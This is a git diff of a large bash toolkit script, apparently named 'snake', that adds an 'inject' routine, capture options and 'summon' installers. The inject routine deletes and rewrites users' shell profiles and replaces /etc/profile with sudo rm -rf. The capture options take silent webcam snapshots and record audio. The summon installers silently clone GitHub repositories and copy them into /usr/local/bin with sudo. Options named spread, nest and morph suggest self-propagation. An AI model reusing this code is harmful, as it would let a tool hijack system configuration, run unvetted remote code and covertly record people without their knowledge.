+         echo "geolocate() { curl ipinfo.io/\$1 }" >> .bash_profile
+         echo "origin() { clear ; ps -p \$1 | awk '{print \$4;}' | sed '1d' }" >> .bash_profile
+         echo "cheese() { imagesnap -w 1 -q }" >> .bash_profile
+         echo "wisconsin() { imagesnap -w 1 -q .snapshot.png }" >> .bash_profile
+         echo "iwannafind() { mdfind \$2 \$1 }" >> .bash_profile
+         echo "iwannasee() { clear ; cat \$(mdfind \$2 \$1) }" >> .bash_profile
+         echo "replace() { sed -i -e 's/\$1/\$2/g' \$3 ; rm \$3-e }" >> .bash_profile
+         echo "ports(){" >> .bash_profile
+         echo "   for i in `seq \$1 \$2`;" >> .bash_profile
+         echo "        do" >> .bash_profile
+         echo "              echo \"проверка процессов для порта  \$i ->>\"" >> .bash_profile
+         echo "              sudo lsof -i :\$i" >> .bash_profile
+         echo "        done" >> .bash_profile
+         echo "}" >> .bash_profile
+         echo "thermic(){" >> .bash_profile
+         echo "while true" >> .bash_profile
+         echo "do" >> .bash_profile
+         echo "    temp" >> .bash_profile
+         echo "    sleep \$1" >> .bash_profile
+         echo "done" >> .bash_profile
+         echo "}" >> .bash_profile
+         echo "temp(){" >> .bash_profile
+         echo "   WHITE='\e[1;97m'" >> .bash_profile
+         echo "   NC='\033[0m'" >> .bash_profile
+         echo "   clear" >> .bash_profile
+         echo "   istats | sed '\$d'" >> .bash_profile
+         echo "   printf \"\$WHITE\n\"" >> .bash_profile
+         echo "   date" >> .bash_profile
+         echo "   printf \"\$NC\n\"" >> .bash_profile
+         echo "}" >> .bash_profile
+         echo " " >> .bash_profile
+         echo "# Color functions " >> .bash_profile
+         echo " " >> .bash_profile
+         echo "_green(){" >> .bash_profile
+         echo "   GREEN='\e[1;92m'" >> .bash_profile
+         echo "   clear" >> .bash_profile
+         echo "   printf \"\$GREEN Green Bold Activate\n\"" >> .bash_profile
+         echo "   date" >> .bash_profile
+         echo "}" >> .bash_profile
+         echo "_white(){" >> .bash_profile
+         echo "   WHITE='\e[1;97m'" >> .bash_profile
+         echo "   clear" >> .bash_profile
+         echo "   printf \"\$WHITE White Bold Activate\n\"" >> .bash_profile
+         echo "   date" >> .bash_profile
+         echo "}" >> .bash_profile
+         echo "_yellow(){" >> .bash_profile
+         echo "   YELLOW='\e[1;93m'" >> .bash_profile
+         echo "   clear" >> .bash_profile
+         echo "   printf \"\$YELLOW Yellow Bold Activate\n\"" >> .bash_profile
+         echo "   date" >> .bash_profile
+         echo "}" >> .bash_profile
+         echo "_red(){" >> .bash_profile
+         echo "   RED='\e[1;91m'" >> .bash_profile
+         echo "   clear" >> .bash_profile
+         echo "   printf \"\$RED Red Bold Activate\n\"" >> .bash_profile
+         echo "   date" >> .bash_profile
+         echo "}" >> .bash_profile
+         echo "_cyan(){" >> .bash_profile
+         echo "   CYAN='\e[1;96m'" >> .bash_profile
+         echo "   clear" >> .bash_profile
+         echo "   printf \"\$CYAN Cyan Bold Activate\n\"" >> .bash_profile
+         echo "   date" >> .bash_profile
+         echo "}" >> .bash_profile
+         echo "_normal(){" >> .bash_profile
+         echo "   NC='\033[0m'" >> .bash_profile
+         echo "   clear" >> .bash_profile
+         echo "   printf \"\$NC Text Normalized\n\"" >> .bash_profile
+         echo "   date" >> .bash_profile
+         echo "}" >> .bash_profile
+         echo "quietTextRestore(){" >> .bash_profile
+         echo "   NC='\033[0m'" >> .bash_profile
+         echo "   printf \"\$NC\n\"" >> .bash_profile
+         echo "}" >> .bash_profile
+         source ./.bash_profile
+         printf "$RED Injected$NC\n"
+         printf "$RED Resetting in 10 seconds..$NC.\n"
+         sleep 3
+         _poof
+       elif [[ "$1" == "zsh" ]]; then
+         printf "$YELLOW NRY $NC\n"
+       else
+         cd ~
+         sudo rm .profile
+         touch .profile
+         echo " " >> .profile
+         echo "export PS1=\">>> \"" >> .profile
+         echo " " >> .profile
+         echo "# Aliases " >> .profile
+         echo " " >> .profile
+         echo "alias rip=\"sudo kill -9\"" >> .profile
+         echo "alias off=\"sudo airport -z\"" >> .profile
+         echo "alias lock=\"pmset displaysleepnow\"" >> .profile
+         echo "alias die=\"killall Terminal\"" >> .profile
+         echo "alias ll=\"ls -FGlAh\"" >> .profile
+         echo "alias home=\"cd ~\"" >> .profile
+         echo "alias root=\"cd /\"" >> .profile
+         echo "alias ?=\"file\"" >> .profile
+         echo "alias _edit=\"nano ~/etc/profile\"" >> .profile
+         echo "alias _update\"source ~/etc/profile\"" >> .profile
+         echo "alias refresh=\"_update ; clear\"" >> .profile
+         echo "alias relist=\"_update ; clear ; ls\"" >> .profile
+         echo "alias highlight=\"_update ; _yellow ; clear ; ls ; quietTextRestore\"" >> .profile
+         echo "alias reveal=\"_white ; _update ; clear ; ls -la ; quietTextRestore\"" >> .profile
+         echo "alias rn=\"react-native\"" >> .profile
+         echo "alias ther=\"while true" >> .profile
+         echo "do" >> .profile
+         echo "    temp" >> .profile
+         echo "    sleep 7" >> .profile
+         echo "done\"" >> .profile
+         echo " " >> .profile
+         echo "# Functions " >> .profile
+         echo " " >> .profile
+         echo "cd() { builtin cd \"\$@\"; ls ;}" >> .profile
+         echo "_+() { open -a \$1 \$1 }" >> .profile
+         echo "_a() { open -a /Applications/\"\$1.app\"/Contents/MacOS/\$1 }" >> .profile
+         echo "_f() { open -a Finder ./ }" >> .profile
+         echo "space() { du -hs "\$@" | sort -nr; }" >> .profile
+         echo "mkdg() { mkdir \$1 ; clear ; cd \$1 ;}" >> .profile
+       #  echo "docked() { sudo lsof -i :\"\$@\" ;}" >> .bash_profile
+         echo "destroy() { killall -9 appPID \"\$1\" ;}" >> .profile
+         echo "geolocate() { curl ipinfo.io/\$1 }" >> .profile
+         echo "origin() { clear ; ps -p \$1 | awk '{print \$4;}' | sed '1d' }" >> .profile
+         echo "cheese() { imagesnap -w 1 -q }" >> .profile
+         echo "wisconsin() { imagesnap -w 1 -q .snapshot.png }" >> .profile
+         echo "iwannafind() { mdfind \$2 \$1 }" >> .profile
+         echo "iwannasee() { clear ; cat \$(mdfind \$2 \$1) }" >> .profile
+         echo "replace() { sed -i -e 's/\$1/\$2/g' \$3 ; rm \$3-e }" >> .profile
+         echo "ports(){" >> .profile
+         echo "   for i in `seq \$1 \$2`;" >> .profile
+         echo "        do" >> .profile
+         echo "              echo \"проверка процессов для порта  \$i ->>\"" >> .profile
+         echo "              sudo lsof -i :\$i" >> .profile
+         echo "        done" >> .profile
+         echo "}" >> .profile
+         echo "thermic(){" >> .profile
+         echo "while true" >> .profile
+         echo "do" >> .profile
+         echo "    temp" >> .profile
+         echo "    sleep \$1" >> .profile
+         echo "done" >> .profile
+         echo "}" >> .profile
+         echo "temp(){" >> .profile
+         echo "   WHITE='\e[1;97m'" >> .profile
+         echo "   NC='\033[0m'" >> .profile
+         echo "   clear" >> .profile
+         echo "   istats | sed '\$d'" >> .profile
+         echo "   printf \"\$WHITE\n\"" >> .profile
+         echo "   date" >> .profile
+         echo "   printf \"\$NC\n\"" >> .profile
+         echo "}" >> .profile
+         echo " " >> .profile
+         echo "# Color functions " >> .profile
+         echo " " >> .profile
+         echo "_green(){" >> .profile
+         echo "   GREEN='\e[1;92m'" >> .profile
+         echo "   clear" >> .profile
+         echo "   printf \"\$GREEN Green Bold Activate\n\"" >> .profile
+         echo "   date" >> .profile
+         echo "}" >> .profile
+         echo "_white(){" >> .profile
+         echo "   WHITE='\e[1;97m'" >> .profile
+         echo "   clear" >> .profile
+         echo "   printf \"\$WHITE White Bold Activate\n\"" >> .profile
+         echo "   date" >> .profile
+         echo "}" >> .profile
+         echo "_yellow(){" >> .profile
+         echo "   YELLOW='\e[1;93m'" >> .profile
+         echo "   clear" >> .profile
+         echo "   printf \"\$YELLOW Yellow Bold Activate\n\"" >> .profile
+         echo "   date" >> .profile
+         echo "}" >> .profile
+         echo "_red(){" >> .profile
+         echo "   RED='\e[1;91m'" >> .profile
+         echo "   clear" >> .profile
+         echo "   printf \"\$RED Red Bold Activate\n\"" >> .profile
+         echo "   date" >> .profile
+         echo "}" >> .profile
+         echo "_cyan(){" >> .profile
+         echo "   CYAN='\e[1;96m'" >> .profile
+         echo "   clear" >> .profile
+         echo "   printf \"\$CYAN Cyan Bold Activate\n\"" >> .profile
+         echo "   date" >> .profile
+         echo "}" >> .profile
+         echo "_normal(){" >> .profile
+         echo "   NC='\033[0m'" >> .profile
+         echo "   clear" >> .profile
+         echo "   printf \"\$NC Text Normalized\n\"" >> .profile
+         echo "   date" >> .profile
+         echo "}" >> .profile
+         echo "quietTextRestore(){" >> .profile
+         echo "   NC='\033[0m'" >> .profile
+         echo "   printf \"\$NC\n\"" >> .profile
+         echo "}" >> .profile
+         sudo rm -rf /etc/profile
+         sudo cp ./.profile /etc/profile
+         source /etc/profile
+       fi
+
+    fi
+
     : '
     echo "wios(){" >> .bash_profile
     echo "   sudo cd /usr/local/bin " >> .bash_profile
@@ -4637,17 +5758,39 @@ elif [[ $_system == "Linux" ]]; then
 }
 
 
+_record_v(){
+
+   printf "$RED Video capture not ready yet$NC\n"
+
+}
+
+_record_a(){
+
+   ffmpeg -f avfoundation -i ":1" capture_a.mp3
+
+}
+
+_record_w(){
+
+   printf "$RED Workstation capture not ready yet$NC\n"
+
+}
+
 _capture(){
 
 
   if [ "$1" == "-i" ]; then
-    _cheese
+    _cheese $2
   elif [[ "$1" == "-d" ]]; then
-    _snap
+    _snap $2
   elif [[ "$1" == "-v" ]]; then
-    printf "$RED Video capture not ready yet$NC\n"
+    _record_v $2
   elif [[ "$1" == "-a" ]]; then
-    printf "$RED Audio capture not ready yet$NC\n"
+    _record_a $2
+  elif [[ "$1" == "-w" ]]; then
+    _record_w $2
+  else
+    printf "$RED Capture method invalid. Aborting.$NC..\n"
   fi
 
 
@@ -4718,6 +5861,19 @@ _scanHouse(){
 
 
 
+
+}
+
+
+_bdb(){
+
+  sudo cp /usr/local/bin/snake ./snake
+  sudo cp snake snake2
+  sh snake -uninstall
+  sudo rm -rf snake
+  cat snake2 | sed "s/_jvdr()/_uf()/g" | sed "s/_vndr()/_uf2()/g" | sed "s/_jvdr/_newj/g" | sed "s/_vndr/_newv/g" > snake
+  sudo rm -rf snake2 ; sh snake -qinstall ; sudo rm -rf snake
+  printf "$RED Backup database initiated.$NC\n"
 
 }
 
@@ -5017,9 +6173,23 @@ _real_summon(){
       cd .. ; cd .. ; rm -rf .$1
       printf "$RED $1 is here $NC\n"
     elif [[ $_system == "Linux" ]]; then
-      printf "$RED Not available on your system$NC\n"
+      printf "$RED Summoning $1...$NC\n"
+      cd ~
+      mkdir .$1 ; cd .$1/
+      git clone https://github.com/mldMoldovan/$1 -q >/dev/null 2>&1
+      cd ./$1
+      sudo chmod +x $1 ; sudo cp $1 /usr/local/bin/
+      cd .. ; cd .. ; rm -rf .$1
+      printf "$RED $1 is here $NC\n"
     elif [[ $_system == "Minix" ]]; then
-      printf "$RED Not available on your system$NC\n"
+      printf "$RED Summoning $1...$NC\n"
+      cd ~
+      mkdir .$1 ; cd .$1/
+      git clone https://github.com/mldMoldovan/$1 -q >/dev/null 2>&1
+      cd ./$1
+      chmod +x $1 ; cp $1 /usr/local/bin/
+      cd .. ; cd .. ; rm -rf .$1
+      printf "$RED $1 is here $NC\n"
     elif [[ $_system == "OpenBSD" ]]; then
       printf "$RED Not available on your system$NC\n"
     elif [[ $_system == "Haiku" ]]; then
@@ -5046,41 +6216,15 @@ _summon(){
    elif [[ "$1" == "roi" ]]; then
       _real_summon roi
    elif [[ "$1" == "wilfred" ]]; then
-      printf "$YELLOW Summoning Wilfred...$NC\n"
-      cd ~
-      mkdir .wilfred ; cd .wilfred/
-      git clone https://github.com/mldMoldovan/wilfred -q
-      cd ./wilfred
-      sudo cp wilfred /usr/local/bin ; sudo chmod +x wilfred
-      cd .. ; cd .. ; rm -rf .wilfred
-      printf "$YELLOW Wilfred is here $NC\n"
+      _real_summon wilfred
    elif [[ "$1" == "salazaar" ]]; then
-      printf "$GREEN Summoning Salazaar...$NC\n"
-      cd ~
-      mkdir .salazaar ; cd .salazaar/
-      git clone https://github.com/mldMoldovan/salazaar -q
-      cd ./salazaar
-      sudo cp salazaar /usr/local/bin ; sudo chmod +x salazaar
-      cd .. ; cd .. ; rm -rf .salazaar
-      printf "$GREEN Salazaar is here $NC\n"
+      _real_summon salazaar
    elif [[ "$1" == "ryan" ]]; then
-      printf "$BLUE Summoning Ryan...$NC\n"
-      cd ~
-      mkdir .ryan ; cd .ryan/
-      git clone https://github.com/mldMoldovan/ryan -q >/dev/null
-      cd ./ryan
-      sudo cp ryan /usr/local/bin ; sudo chmod +x ryan
-      cd .. ; cd .. ; rm -rf .ryan
-      printf "$BLUE Ryan is here $NC\n"
-    elif [[ "$1" == "shinigami" ]]; then
-      printf "$WHITE Summoning Shinigami...$NC\n"
-      cd ~
-      mkdir .shinigami ; cd .shinigami/
-      git clone https://github.com/mldMoldovan/shinigami -q
-      cd ./shinigami
-      sudo chmod +x shinigami ; sudo cp shinigami /usr/local/bin
-      cd .. ; cd .. ; sudo rm -rf .shinigami
-      printf "$RED Shinigami is here $NC\n"
+      _real_summon ryan
+   elif [[ "$1" == "shinigami" ]]; then
+      _real_summon shinigami
+   elif [[ "$1" == "samael" ]]; then
+      _real_summon samael
    else
       printf "$RED Summoning failed$NC\n"
    fi
@@ -5231,13 +6375,11 @@ elif [[ "$1" == "-e" ]]; then
 elif [[ "$1" == "--spread" ]]; then
 
     _spread
-    clear
     printf "$_name $RED _spread $NC  \n"
 
 elif [[ "$1" == "-spread" ]]; then
 
     _spread
-    clear
     printf "$_name $RED _spread $NC  \n"
 
 elif [[ "$1" == "--nest" ]]; then
@@ -5280,8 +6422,12 @@ elif [[ "$1" == "-dsp" ]]; then
 
     _exec_u
 
+elif [[ "$1" == "-bdb" ]]; then
+
+      _bdb
+
 elif [[ "$1" == "-oui" ]]; then
-     _vendor $2
+     _vndr $2
 
 elif [[ "$1" == "--morph" ]]; then
 
@@ -5370,7 +6516,7 @@ elif [[ "$1" == "-lock" ]]; then
 
 elif [[ "$1" == "-inject" ]]; then
 
-     _inject
+     _inject $2 $3
 
 elif [[ "$1" == "_wit?" ]]; then
 
@@ -5631,7 +6777,11 @@ elif [[ "$1" == "--light" ]]; then
 
 elif [[ "$1" == "-capture" ]]; then
 
-  _capture $2
+  _capture $2 $3
+
+elif [[ "$1" == "--capture" ]]; then
+
+  _capture $2 $3
 
 else
 
